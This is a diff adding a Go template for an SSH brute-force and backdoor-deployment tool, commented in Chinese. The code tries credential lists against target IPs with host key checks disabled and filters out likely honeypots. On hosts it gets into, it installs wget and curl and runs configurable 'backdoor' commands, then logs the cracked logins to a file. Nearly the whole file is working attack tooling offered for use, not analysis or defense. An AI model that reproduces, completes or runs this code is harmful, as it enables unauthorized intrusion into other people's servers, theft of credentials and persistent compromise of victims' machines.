@@ -1,0 +1,298 @@
+// SSH 爆破 runner —— 模式 6
+// 特性：蜜罐检测、后门部署、超时保护、进度卡死自动重试
+
+package main
+
+import (
+	"fmt"
+	"os"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+	"runtime"
+
+	"golang.org/x/crypto/ssh"
+)
+
+var wg sync.WaitGroup
+var semaphore = make(chan struct{}, {{.SemaphoreSize}})
+var completedCount int64
+var totalTasks int64
+var startTime time.Time
+var lastCompletedCount int64
+var lastUpdateTime time.Time
+var retryFlag = false
+
+var ENABLE_BACKDOOR = {{.EnableBackdoor}}
+var CUSTOM_BACKDOOR_CMDS = {{.BackdoorCmds}}
+
+// ── SSH 连接尝试 ──
+func trySSH(ip, port, username, password string) (*ssh.Client, bool) {
+	addr := fmt.Sprintf("%s:%s", ip, port)
+	config := &ssh.ClientConfig{
+		User:            username,
+		Auth:            []ssh.AuthMethod{ssh.Password(password)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         2 * time.Second,
+	}
+	client, err := ssh.Dial("tcp", addr, config)
+	if err != nil {
+		return nil, false
+	}
+	return client, true
+}
+
+// ── 蜜罐检测 ──
+func isLikelyHoneypot(client *ssh.Client) bool {
+	session, err := client.NewSession()
+	if err != nil {
+		return true
+	}
+	defer session.Close()
+
+	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
+	if err != nil {
+		return true
+	}
+
+	output, err := session.CombinedOutput("echo $((1+1))")
+	if err != nil {
+		return true
+	}
+	return strings.TrimSpace(string(output)) != "2"
+}
+
+{{.HandlerCode}}
+
+// ── 后门部署 ──
+func deployBackdoor(client *ssh.Client, ip string, port string, username string, password string, cmds []string) {
+	if !checkTool(client, "unzip") {
+		fmt.Println("🔧 未检测到 unzip，尝试安装中...")
+		if !installPackage(client, "unzip") || !checkTool(client, "unzip") {
+			fmt.Println("❌ unzip 安装失败")
+			recordFailure(ip, port, username, password, "unzip 安装失败")
+			return
+		}
+	}
+	if !checkTool(client, "wget") {
+		fmt.Println("🔧 未检测到 wget，尝试安装中...")
+		if !installPackage(client, "wget") || !checkTool(client, "wget") {
+			fmt.Println("❌ wget 安装失败")
+			recordFailure(ip, port, username, password, "wget 安装失败")
+			return
+		}
+	}
+	if !checkTool(client, "curl") {
+		fmt.Println("🔧 未检测到 curl，尝试安装中...")
+		if !installPackage(client, "curl") || !checkTool(client, "curl") {
+			fmt.Println("❌ curl 安装失败")
+			recordFailure(ip, port, username, password, "curl 安装失败")
+			return
+		}
+	}
+
+	backdoorCmd := strings.Join(cmds, " && ")
+	payloadSession, err := client.NewSession()
+	if err != nil {
+		fmt.Println("❌ 创建 payload session 失败:", err)
+		recordFailure(ip, port, username, password, "无法创建 payload session")
+		return
+	}
+	defer payloadSession.Close()
+
+	err = payloadSession.Run(backdoorCmd)
+	if err != nil {
+		fmt.Println("❌ 后门命令执行失败")
+		recordFailure(ip, port, username, password, "后门命令执行失败")
+		return
+	}
+
+	fmt.Println("✅ 成功部署后门")
+	recordSuccess(ip, port, username, password)
+}
+
+func checkTool(client *ssh.Client, name string) bool {
+	session, err := client.NewSession()
+	if err != nil {
+		return false
+	}
+	defer session.Close()
+	cmd := fmt.Sprintf("command -v %s >/dev/null 2>&1 && echo OK || echo MISSING", name)
+	output, err := session.CombinedOutput(cmd)
+	if err != nil {
+		return false
+	}
+	return strings.Contains(string(output), "OK")
+}
+
+func installPackage(client *ssh.Client, name string) bool {
+	session, err := client.NewSession()
+	if err != nil {
+		return false
+	}
+	defer session.Close()
+
+	installCmd := fmt.Sprintf(`
+		if command -v apt >/dev/null 2>&1; then
+			apt update -y && apt install -y %[1]s
+		elif command -v yum >/dev/null 2>&1; then
+			yum install -y %[1]s
+		elif command -v opkg >/dev/null 2>&1; then
+			opkg update && opkg install %[1]s
+		else
+			echo "NO_PACKAGE_MANAGER"
+		fi
+	`, name)
+
+	err = session.Run(installCmd)
+	return err == nil
+}
+
+func recordSuccess(ip, port, username, password string) {
+	f, err := os.OpenFile("hmsuccess.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err == nil {
+		defer f.Close()
+		fmt.Fprintf(f, "%s:%s %s %s\n", ip, port, username, password)
+		f.Sync()
+	}
+}
+
+func recordFailure(ip, port, username, password, reason string) {
+	f, err := os.OpenFile("hmfail.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err == nil {
+		defer f.Close()
+		fmt.Fprintf(f, "%s:%s %s %s 失败原因: %s\n", ip, port, username, password, reason)
+	}
+}
+
+// ── SSH 进度条（带卡死检测） ──
+func sshUpdateProgress() {
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		count := atomic.LoadInt64(&completedCount)
+		percent := float64(count) / float64(totalTasks) * 100
+		elapsed := int(time.Since(startTime).Seconds())
+
+		if count == 0 {
+			fmt.Printf("\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			lastUpdateTime = time.Now()
+			lastCompletedCount = count
+			continue
+		}
+
+		remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+		fmt.Printf("\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒",
+			count, totalTasks, percent, remaining/60, remaining%60)
+
+		if count == lastCompletedCount && time.Since(lastUpdateTime) > 60*time.Second {
+			fmt.Println("\n进度卡住，重新开始当前任务")
+			triggerFileCleanUp()
+			return
+		}
+
+		lastCompletedCount = count
+		lastUpdateTime = time.Now()
+
+		if count >= totalTasks {
+			fmt.Println("\n进度完成！")
+			return
+		}
+	}
+}
+
+func triggerFileCleanUp() {
+	fmt.Println("清理文件并准备重新执行爆破...")
+	if err := os.Remove("{{.OutputFile}}"); err != nil {
+		fmt.Println("删除文件失败:", err)
+	} else {
+		fmt.Println("已删除当前文件 {{.OutputFile}}")
+	}
+	retryFlag = true
+}
+
+func waitTimeout(wg *sync.WaitGroup, timeout time.Duration) bool {
+	done := make(chan struct{})
+	go func() {
+		wg.Wait()
+		close(done)
+	}()
+	select {
+	case <-done:
+		return true
+	case <-time.After(timeout):
+		return false
+	}
+}
+
+// ── SSH main ──
+func main() {
+	inputFile := "{{.InputFile}}"
+	outputFile := "{{.OutputFile}}"
+
+RETRY:
+	lines, err := os.ReadFile(inputFile)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法读取输入文件: %v\n", err)
+		return
+	}
+
+	usernames := {{.UserList}}
+	passwords := {{.PassList}}
+	batchSize := {{.BatchSize}}
+
+	batch := []string{}
+	allLines := strings.Split(string(lines), "\n")
+	for _, line := range allLines {
+		line = strings.TrimSpace(line)
+		if line != "" {
+			batch = append(batch, line)
+		}
+	}
+
+	totalTasks = int64(len(batch))
+	startTime = time.Now()
+	completedCount = 0
+	lastCompletedCount = 0
+	lastUpdateTime = time.Now()
+	retryFlag = false
+
+	go sshUpdateProgress()
+
+	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法打开输出文件: %v\n", err)
+		return
+	}
+	defer file.Close()
+
+	for i := 0; i < len(batch); i += batchSize {
+		end := i + batchSize
+		if end > len(batch) {
+			end = len(batch)
+		}
+		currentBatch := batch[i:end]
+
+		for _, ipPort := range currentBatch {
+			processIP(ipPort, file, usernames, passwords)
+		}
+
+		if !waitTimeout(&wg, 120*time.Second) {
+			fmt.Println("\n等待任务超时，主动触发重试！")
+			triggerFileCleanUp()
+			break
+		}
+		time.Sleep(100 * time.Millisecond)
+		triggerGC()
+	}
+
+	if retryFlag {
+		fmt.Println("⚠️ 重新爆破启动...")
+		goto RETRY
+	}
+
+	time.Sleep(1 * time.Second)
+	fmt.Println("\n全部处理完成！")
+}
